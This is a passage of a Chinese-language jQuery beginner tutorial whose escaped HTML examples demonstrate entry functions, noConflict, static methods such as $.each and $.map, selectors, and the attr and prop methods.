不报错,后面还可以接着继续写 $("div").eq(1).css('background', 'yellow').css('width', '200px'); &#125;); &lt;/script&gt; &lt;style type="text/css"&gt; div &#123; width: 100px; height: 100px; border: 1px solid #000000; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="box01"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;隐式遍历(迭代): 一次操作多个元素12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;01-初识jQuery&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; // 1.原生JavaScript var div = document.getElementsByTagName("div"); // div.style.backgroundColor = "red";// 无效 for (var i = 0; i &lt; div.length; i++) &#123; div[i].style.backgroundColor = "red"; &#125; // 2.jQuery $(document).ready(function () &#123; // 隐式遍历(迭代)找到的所有div $("div").css('background', 'yellow'); &#125;); &lt;/script&gt; &lt;style type="text/css"&gt; div &#123; width: 100px; height: 100px; border: 1px solid #000000; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;div1&lt;/div&gt;&lt;div&gt;div2&lt;/div&gt;&lt;div&gt;div3&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;读写合一: 读数据/写数据使用是一个函数1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;01-初识jQuery&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(document).ready(function () &#123; // 读取数据 var $tx = $("div").eq(0).text(); alert($tx); // 写入数据 $("div").eq(0).text("新的数据"); &#125;); &lt;/script&gt; &lt;style type="text/css"&gt; div &#123; width: 100px; height: 100px; border: 1px solid #000000; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;div1&lt;/div&gt;&lt;div&gt;div2&lt;/div&gt;&lt;div&gt;div3&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;事件处理DOM操作(C增U改D删)样式操作动画丰富的插件支持浏览器兼容(前端开发者痛点)1.x：兼容IE678，但相对其它版本文件较大，官方只做BUG维护，功能不再新增，最终版本：1.12.4 (2016年5月20日).2.x：不兼容IE678，相对1.x文件较小，官方只做BUG维护，功能不再新增，最终版本：2.2.4 (2016年5月20日)3.x：不兼容IE678，只支持最新的浏览器，很多老的jQuery插件不支持这个版本，相对1.x文件较小，提供不包含Ajax/动画API版本。应该选择几点几版本jQuery?查看百度网页源码使用1.x查看腾讯网页源码使用1.x查看京东网页源码使用1.x综上所述学习1.x,选择1.x应该使用开发版还是生产版?开发版: 所有代码没有经过压缩,体积更大(200-300KB)生产版:所有代码经过压缩,提及更小(30-40KB)初学者为了更好的理解jQuery编码时使用开发板,项目上线时为了提升访问速度使用生产版……3. 如何使用jQuery？下载jQuery库下载地址: http://code.jquery.com/引入下载的jQuery库12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;02&lt;/title&gt; &lt;!--&lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt;--&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; // 注意:以下两个引入的jQuery版本不同，弹出顺序也不同 // 引入的是1.x版本的，则先弹出jQuery写法的，然后再弹出原生写法的 // 引入的是3.x版本的，则先弹出原生写法的，然后再弹出jQuery写法的 // 1.原生JS的固定写法 window.onload = function (ev) &#123; alert('Hello World! 1'); &#125;; // 2.jQuery的固定写法 $(document).ready(function () &#123; alert('Hello World! 2'); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;编写jQuery代码12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;01-初识jQuery&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(document).ready(function () &#123; // 所有jQuery代码写在这里面 alert("hello LNJ"); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;二、入口函数1. jQuery与JavaScript加载模式对比多个window.onload只会执行一次, 后面的会覆盖前面的多个$(document).ready()会执行多次,后面的不会覆盖前面的不会覆盖的本质(了解,后面jQuery原理会详细讲解)jQuery框架本质是一个闭包,每次执行我们都会给ready函数传递一个新的函数,不同函数内部的数据不会相互干扰123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;03-jQuery和js加载模式&lt;/title&gt; &lt;!--&lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt;--&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; /* * 原生JS和jQuery入口函数的的加载模式不同 * 原生JS会等到DOM元素加载完毕，并且图片也加载完毕才会执行 * jQuery会等到DOM元素加载完毕，但是不会等到图片也加载完毕就会执行 */ /* window.onload = function (ev) &#123; // 1.通过原生的JS的入口函数可以拿到DOM元素 var img = document.getElementsByTagName('img')[0]; console.log(img); // 快捷键写法:先写img,然后再写.log,最后按Tab键就会出来 // 2.通过原生的JS的入口函数可以拿到DOM元素的宽度 var width = window.getComputedStyle(img).width; console.log('onload', width); // onload 1024px &#125;; */ /* $(document).ready(function () &#123; // 1.通过jQuery的入口函数可以拿到DOM元素 var $img = $("img")[0]; console.log($img); // 2.通过jQuery的入口函数不可以拿到DOM元素的宽度 var $width = $img.width; console.log('ready', $width); // ready 0 &#125;); */ /* * 原生JS如果编写了多个入口函数，后面编写的会覆盖前面编写的 * jQuery编写了多个入口函数，后面编写的不会覆盖前面编写的 */ window.onload = function (ev) &#123; alert('Hello World! 1'); // 不弹出 &#125;; window.onload = function (ev) &#123; alert('Hello World! 2'); // 弹出 &#125;; $(document).ready(function () &#123; alert('Hello World! 3'); // 弹出 &#125;); $(document).ready(function () &#123; alert('Hello World! 4'); // 弹出 &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;img src="images/风采铃.jpg" alt=""&gt;&lt;/body&gt;&lt;/html&gt;window.onload$(document).ready()执行时机必须等待网页全部加载完毕(包括图片等),然后再执行包裹代码只需要等待网页中的DOM结构加载完毕,就能执行包裹的代码执行次数只能执行一次,如果有第二次,那么第一次的执行会被覆盖可以执行多次,第N次都不会被上 一次覆盖简写方案无$(function () { });为什么我们能访问$符号?因为$符号jQuery框架对外暴露的一个全局变量JavaScript中如何定义一个全局变量?所有全局变量是 window 对象的属性1234567891011function test () &#123; var customValue = 998; alert(customValue); // 1.没有如下代码customValue就不是一个全局变量,函数执行完毕之后 // customValue会被自动释放,test函数以外的地方访问不到customValue // 2.加上如下代码之后customValue就会变成一个全局变量,函数执行完毕也不 // 会被释放,test函数以外的地方可以访问customValue // window.customValue = customValue;&#125;test();alert(customValue);所以jQuery框架源码实现1window.jQuery = window.$ = jQuery;所以想要使用jQuery框架只有两种方式,一种是通过$,一种是通过jQueryjQuery入口函数的其它编写方式如下1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;04-jQuery入口函数其它写法&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; // 方法一 $(document).ready(function () &#123; alert('Hello World!'); &#125;); // 方式二 (推荐使用这种写法) jQuery(document).ready(function () &#123; alert('Hello World!'); &#125;); // 方式三 (推荐使用这种写法) $(function () &#123; alert('Hello World!'); &#125;); // 方式四 jQuery(function () &#123; alert('Hello World!'); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;2. 解决$符号冲突问题为什么是window.jQuery = window.$ = jQuery;,而不是window.jQuery = jQuery;jQuery框架之所以提供了jQuery访问还提供$访问,就是为了提升开发者的编码效率$符号冲突怎么办?很多js的框架都提供了类似jQuery这样的便捷访问方式,所以很有可能某一天我们在使用多个框架的时,多个框架作者提供的便捷访问方式冲突(A框架通过$访问,B框架也通过​$访问)释放$使用权当便捷访问符号发生冲突时,我们可以释放$使用权, 释放之后只能使用jQuery自定义便捷访问符号当便捷访问符号发生冲突时,我们可以自定义便捷访问符号123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;05-jQuery冲突问题&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="js/test.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; // 1.释放$符号的控制权 // 注意点：释放操作必须在编写其他jQuery代码之前编写 // 释放之后就不能在使用$，改为使用jQuery jQuery.noConflict(); jQuery(document).ready(function () &#123; alert('Hello World!'); &#125;); // 2.自定义访问符号 var nl = jQuery.noConflict(); nl(document).ready(function () &#123; alert('Hello World!'); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;三、核心函数和静态方法1. jQuery核心函数从jQuery文档中可以看出,jQuery核心函数一共3大类4小类jQuery(callback)当DOM加载完成后执行传入的回调函数jQuery([sel,[context]])接收一个包含 CSS 选择器的字符串，然后用这个字符串去匹配一组元素,并包装成jQuery对象原生JS对象和jQuery对象相互转换1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;&lt;/title&gt; &lt;!--&lt;script type="text/javascript" src="js/jquery-3.3.1.min.js"&gt;&lt;/script&gt;--&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; var $box = $("#box"); // $box.text("新的数据"); // jQuery对象不能使用原生js对象的方法 // $box.innerText = "新的数据"; // 将jQuery对象转换为原生js对象 // 注意: 不是eq(0),eq函数返回的是jQuery类型对象,get函数返回的是原生类型对象 // var box = $box.get(0); var box = $box[0]; box.innerText = "新的数据"; var box2 = document.getElementById("box"); // 原生js对象不能使用jQuery对象的方法 // box2.text("新的数据2"); // 原生js对象只能使用原生的js方法 // box2.innerText = "新的数据2"; // 将原生js对象转换为jQuery对象 var $box2 = $(box); $box2.text("新的数据2"); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;Tips:为了方便开发者之间沟通和阅读,一般情况下所有jQuery操作相关的变量前面加上$jQuery(html,[ownerDoc])根据 HTML 标记字符串，动态创建DOM元素1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;06-jQuery核心函数&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; // $();代表jQuery的核心函数 // 1.接收一个函数,作为入口函数 $(function () &#123; alert('Hello World!'); // 2.接收一个字符串 // 2.1接收一个字符串选择器 // 返回一个jQuery对象，对象中保存了找到的DOM元素 var $box1 = $(".box1"); var $box2 = $("#box2"); console.log($box1); console.log($box2); // 2.2接收一个代码片段 // 返回一个jQuery对象，对象中保存了创建的DOM元素 var $p = $("&lt;p&gt;我是p&lt;/p&gt;"); console.log($p); $box1.append($p); // 2.3接收一个DOM元素 // 会被包装成一个jQuery对象返回给我们 var span = document.getElementsByTagName('span')[0]; console.log(span); // 原生DOM元素 var $span = $(span); console.log($span); // 把原生DOM元素包装成一个jQuery对象 &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="box1"&gt;&lt;/div&gt;&lt;div id="box2"&gt;&lt;/div&gt;&lt;span&gt;我是span&lt;/span&gt;&lt;/body&gt;&lt;/html&gt;2. jQuery对象jQuery对象的本质是什么?jQuery对象的本质是一个伪数组什么是伪数组?有0到length-1的属性并且有length属性123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;07-jQuery对象&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; /* * 1.什么是jQuery对象 * jQuery对象是一个伪数组 * * 2.什么是伪数组 * 由0到length-1的属性，并且有length属性 */ var $div = $("div"); console.log($div); var arr = [1, 3, 5]; console.log(arr); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;div1&lt;/div&gt;&lt;div&gt;div2&lt;/div&gt;&lt;div&gt;div3&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;3. jQuery静态方法什么是静态方法?静态方法对应的是对象方法,对象方法用实例对象调用,而静态方法用类名调用12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;08-静态方法和实例方法&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; // 1.定义一个类 function AClass() &#123; &#125;; // 2.给这个类添加一个静态方法 // 直接添加给类的就是静态方法 AClass.staticMthod = function () &#123; alert('staticMthod'); &#125;; // 静态方法通过类名调用 AClass.staticMthod(); // 2.给这个类添加一个实例方法 AClass.prototype.instanceMethod = function () &#123; alert('instanceMethod'); &#125;; // 实例方法通过类的实例调用 // 创建一个实例 var a = new AClass(); a.instanceMethod(); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;jQuery.holdReady(hold)暂停或者恢复jQuery.ready()事件传入true或false12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;12-jQuery-holdReady方法&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; // 使用$直接调用,是静态方法 $.holdReady(true); // 作用：暂停ready代码的执行 $(function () &#123; alert('function'); &#125;) &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button&gt;点击测试弹出&lt;/button&gt;&lt;script type="text/javascript"&gt; var btn = document.getElementsByTagName('button')[0]; btn.onclick = function () &#123; alert('btn'); $.holdReady(false); // 不解除的话alert('function');不会弹出 &#125;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;$.each(object,[callback])遍历对象或数组优点统一遍历对象和数组的方式回调参数的顺序更符合我们的思维模式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;09-jQuery-each方法&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; var arr = [1, 3, 5, 7, 9]; var obj = &#123;0: 1, 1: 3, 2: 5, 3: 7, 4: 9, length: 5&#125;; /* * 第一个参数：遍历到的元素 * 第二个参数：当前遍历到的索引 * 注意点：原生的forEach方法只能遍历数组，不能遍历伪数组 * */ arr.forEach(function (value, index) &#123; console.log(index, value); &#125;); // TypeError: obj.forEach is not a function /* obj.forEach(function (value, index) &#123; console.log(index, value); &#125;); */ // 1.利用jQuery的each静态方法遍历数组 /* * 第一个参数：当前遍历到的索引 * 第二个参数：遍历到的数组 * 注意点：jQuery的each方法可以遍历伪数组 * */ $.each(arr, function (index, value) &#123; console.log(index, value); &#125;); $.each(obj, function (index, value) &#123; console.log(index, value); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;$.map(arr|obj,callback)遍历对象或数组,将回调函数的返回值组成一个新的数组返回12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;10-jQuery-map方法&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; var arr = [1, 3, 5, 7, 9]; var obj = &#123;0: 1, 1: 3, 2: 5, 3: 7, 4: 9, length: 5&#125;; // 1.利用原生JS的map方法遍历 /* 第一个参数:当前遍历到的元素 * 第二个参数：当前遍历到的索引 * 第三个参数：当前被遍历的数组 * 注意点：和原生的forEach一样，不能遍历伪数组 * */ arr.map(function (value, index, array) &#123; console.log(index, value, array); &#125;); // TypeError: obj.map is not a function /* obj.map(function (value, index, array) &#123; console.log(index, value, array); &#125;); */ /* 第一个参数:要遍历的数组 * 第二个参数：每遍历一个元素之后执行的回调函数 * 回调函数的参数： * 第一个参数：遍历到的元素 * 第二个参数：遍历到的索引 * 注意点：和jQuery中的each静态方法一样，map静态方法可以遍历伪数组 * */ $.map(arr, function (value, index) &#123; console.log(index, value); &#125;); $.map(obj, function (value, index) &#123; console.log(index, value); &#125;); // jQuery中的each静态方法和map静态方法的区别 // each静态方法默认的返回值就是，遍历谁就返回谁 // map静态方法默认的返回值是一个空数组 // each静态方法不支持在回调函数中对遍历的数组进行处理 // map静态方法可以在回调函数中通过return对遍历的数组进行处理，然后生成一个新数组返回 var res1 = $.each(arr, function (index, value) &#123; console.log(index, value); return value + index; &#125;); var res2 = $.map(arr, function (value, index) &#123; console.log(index, value); return value + index; &#125;); console.log(res1); console.log(res2); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;$.trim(str)去掉字符串起始和结尾的空格$.isArray(obj)判断是否是数组$.isFunction(obj)判断是否是函数$.isWindow(obj)判断是否是window对象1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;11-jQuery其它静态方法&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; /* * $.trim(); * 作用：去除字符串两端的空格 * 参数：需要去除空格的字符串 * 返回值：去除空格之后的字符串 * */ var str = '---- Hello -----'; console.log(str); var res = $.trim(str); console.log(res); // 真数组 var arr = [1, 3, 5, 7, 9]; // 伪数组 var arrlike = &#123;0: 1, 1: 3, 2: 5, 3: 7, 4: 9, length: 5&#125;; // 对象 var obj = &#123;'name': 'hello', 'age': 33&#125;; // 函数 var fn = function () &#123; &#125;; // window对象 var w = window; /* * $.isWindow(); * 作用：判断传入的对象是否是window对象 * 返回值：true/false * */ var res = $.isWindow(arr); console.log(res); /* * $.isArray(); * 作用：判断传入的对象是否是真数组 * 返回值：true/false * */ var res = $.isArray(arr); console.log(res); /* * $.isFunction(); * 作用：判断传入的对象是否是一个函数 * 返回值：true/false * */ var res = $.isFunction(arr); console.log(res); /* * 注意点: jQuery框架本质上是一个函数 * (function (windos, undefined) &#123; * &#125;)(window); * */ var res = $.isFunction(jQuery); console.log(res); // true (function (windos, undefined) &#123; &#125;)(window); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;补充知识使用IDE软件的快捷键方便引用jquery文件Settings，Editor，Live Templates，在右边找到HTML/XML，在Abbreviation中输入字母作为快捷键，在Template text中输入要引用的jquery代码，左下角设置成HTML text,点击应用，以后输入这个字母后按tab键就会自动出来相应的jquery代码使用快捷键打开浏览器Settings，Appearance&amp;Behavior，Keymap，搜索“default”，在Other的Open in deafult browser中鼠标右键，Add Keyboard Shortcut，给打开默认浏览器设置一个快捷键。以后在html中打开浏览器的话就不用鼠标点击了，直接按快捷键即可。四、选择器1. 基础选择器视频参考第十章-CSS选择器选择器名称描述返回示例#idid选择器根据给定的id匹配一个元素单个元素$(“#box”);选取id为box元素.class类选择器根据给定的类名匹配元素集合元素$(“.box”);选取所有类名为box元素element元素选择器根据给定的元素名称匹配元素集合元素$(“p”);选取所有元素*通配符选择器匹配所有元素集合元素$(“*”);选取所有元素selector1,selector2,selectorN并集选择器将所有选择器匹配到的元素合并后一起返回集合元素$(“div,p,.box”);选取所有元素,所有元素和所有类名为box元素2. 层次选择器视频参考第十章-CSS选择器选择器名称描述返回示例$(“ancestor descendant”)后代选择器选取ancestor元素的所有descendant后代标签(不光是儿子,包括孙子/重孙子等)集合元素$(“div span”);选取元素里所有的元素$(“parent &gt; child”)子元素选择器找到选取parent 元素中所有直接子元素child(只有儿子,不包括孙子/重孙子等)集合元素$(“div&gt;span”);选取元素下元素名称是的子元素$(“prev + next”)相邻兄弟选择器选取prev元素后面紧跟的那个next元素集合元素$(“.one+div”);选取类名为one的下一个同级的元素$(“prev ~ siblings”)通用兄弟选择器选取prev元素后面的所有next元素集合元素$(“#two~div”);选取id名为two元素后面所有同级的元素3. 序选择器视频参考第十章-CSS选择器如上内容不再一一赘述,观看第十章-CSS选择器,使用时查询文档即可做开发是脑力活,我们需要掌握的是解决问题的方法,而不是死记硬背4. 属性选择器视频参考第十章-CSS选择器如上内容不再一一赘述,观看第十章-CSS选择器,使用时查询文档即可做开发是脑力活,我们需要掌握的是解决问题的方法,而不是死记硬背5. 内容过滤选择器选择器描述返回:empty选取不包含子元素或文本为空的元素集合元素:parent选取含有子元素或文本的元素集合元素:contains(text)选取含有文本内容为text的元素集合元素:has(selector)选取含有选择器所匹配的元素的元素集合元素:empty:parent:contains(text):has(selector)和:parent区别,parent只要有子元素就会被找到,:has(selector)不仅要有子元素,而且子元素还必须满足我们的条件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;14-jQuery内容选择器&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; // :empty // 作用：找到既没有文本内容也没有子元素的指定元素 var $div = $('div:empty'); console.log($div); // :parent // 作用：找到有文本内容或有子元素的指定元素 var $div = $('div:parent'); console.log($div); // :contains(text) // 作用：找到包含指定文本内容的指定元素 var $div = $("div:contains('我是div')"); console.log($div); // :has(selector) // 作用：找到包含指定子元素的指定元素 var $div = $("div:has('span')"); console.log($div); &lt;/script&gt; &lt;style type="text/css"&gt; div &#123; width: 100px; height: 100px; background: greenyellow; margin-top: 5px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;我是div&lt;/div&gt;&lt;div&gt;我是div123&lt;/div&gt;&lt;div&gt;&lt;span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;p&gt;&lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;五、属性相关1. 属性和属性节点什么是属性?属性就是对象身上的变量只要对象身上都可以添加属性(无论是自定义对象,还是DOM对象)什么是属性节点?在html中编写的所有标签，里面的属性都是属性节点如果操作属性?添加或修改属性(没有就会添加,有就会修改)对象.属性名称 = 值;对象[&quot;属性名称&quot;] = 值;获取属性对象.属性名称对象[&quot;属性名称&quot;]如何操作属性节点?获取属性节点DOM对象.getAttribute(&quot;属性节点名称&quot;)设置属性节点DOM对象.setAttribute(&quot;属性节点名称&quot;, &quot;值&quot;);12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;15-属性和属性节点&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; /* * 1.什么是属性 * 对象身上保存的变量就是属性 * 2.如何操作属性 * 设置：对象.属性名称 = 值 * 获取：对象.属性名称 * 设置：对象['属性名称'] = 值 * 获取：对象['属性名称'] * 3.什么是属性节点 * &lt;span name="it"&gt;&lt;/span&gt; * 在编写html标签中添加的属性就是属性节点 * 在浏览器中找到span这个DOM元素之后，在attributes中保存的所有内容都是属性节点 * 4.如何操作属性节点 * DOM元素.setAttribute('属性名称','属性值'); * DOM元素.getAttribute('属性名称'); * 5.属性和属性节点有什么区别 * 任何对象都有属性，但是只有DOM对象只有属性节点 * */ function Func() &#123; var p = new Func(); p.name = 'hello'; console.log(p.name); p['age'] = 23; console.log(p['age']); var span = document.getElementsByTagName('span')[0]; console.log(span); span.setAttribute('name', 'world!'); console.log(span.getAttribute('name')); &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;span name="it"&gt;11&lt;/span&gt;&lt;/body&gt;&lt;/html&gt;2. jQuery中的attr和prop方法attr(name|pro|key,val|fn)方法用于设置或获取属性节点的值removeAttr(name)方法用于删除指定属性节点123456789101112131415161718192021222324252627282930313233343536&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;16-jQuery-attr方法&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; // 1.attr(name|pro|key,val|fn) // 作用：获取或设置属性节点的值，可以传递一个参数，也可以传递两个 // 如果传递一个参数代表获取属性节点的值 // 如果传递两个参数代表获取属性节点的值 // 注意点：如果是获取：不论找到多少个元素，只返回第一个元素指定节点的值 // 如果是设置：找到多少个元素就会设置多少个元素 // 如果是设置：如果设置的属性节点不存在，那么系统会自动新增 // 2.removeAttr(name) // 作用：删除属性节点 // 注意点：会删除所有找到元素指定的属性节点 $(function () &#123; // console.log($('span').attr('class')); // span1 // $('span').attr('class','box'); // $('span').attr('abc','123'); // $('span').removeAttr('class'); $('span').removeAttr('class name'); // 删除多个属性节点 &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;span class="span1" name="it111"&gt;&lt;/span&gt;&lt;span class="span2" name="it222"&gt;&lt;/span&gt;&lt;/body&gt;&lt;/html&gt;prop(n|p|k,v|f)方法用于设置或者获取元素的属性值removeProp(name)方法attr方法和prop方法区别既然所有的DOM对象，都有一个attributes属性,而prop可以操作属性,所以也可以操作属性节点官方推荐在操作属性节点时,具有 true 和 false 两个属性的属性节点，如 checked, selected 或者 disabled 使用prop()，其他的使用 attr()因为如果具有 true 和 false 两个属性的属性节点,如果没有编写默认attr返回undefined,而prop返回false12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;17-jQuery-prop方法&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; // 1.prop(n|p|k,v|f) // 特点和attr方法一样 // 2.removeProp(name) // 特点和removeAttr方法一样 $(function () &#123; $('span').eq(0).prop('demo','debug'); // 给指定DOM元素设置属性节点 $('span').prop('demo'); // 获取指定DOM元素的属性节点 $('span').removeProp('demo'); // 删除指定DOM元素的属性节点 &#125;); /* * prop方法不仅能操作属性，还能操作属性节点 * */ console.log($('span').prop('class')); // 获取属性节点 $('span').prop('class','box'); // 修改属性节点 // 有checked / 无checked console.log($('input').prop('check')); // true / false console.log($('input').attr('check')); // checked / undefined &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;span class="span1" name="it111"&gt;&lt;/span&gt;&lt;span class="span2" name="it222"&gt;&lt;/span&gt;&lt;input type="checkbox" checked&gt;&lt;/body&gt;&lt;/html&gt;练习1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;18-attr和prop练习&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; // 作用是在输入框里输入图片地址，比如：images/2.jpg，然后点击切换图片，下方的图片就会发生变化 $(function () &#123; // 1.给按钮添加点击事件 var btn = document.getElementsByTagName('button')[0]; btn.onclick = function () &#123; // 2.获取输入框的内容 var input = document.getElementsByTagName('input')[0]; var text = input.value; // 3.修改img的src属性节点的值 $('img').attr('src', text); &#125; &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;input type="text"&gt;&lt;button&gt;切换图片&lt;/button&gt;&lt;br/&gt;&lt;img src="images/1.jpg" alt=""&gt;&lt;/body&gt;&lt;/html&gt;3. jQuery增删ClassjQuery CSS类相关方法都是用于操作DOM对象的class属性节点的值addClass(class|fn)给元素添加一个或多个类removeClass([class|fn])删除元素的一个或多个类toggleClass(class|fn[,sw])添加或删除一个类(存在就删除不存在就添加)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; 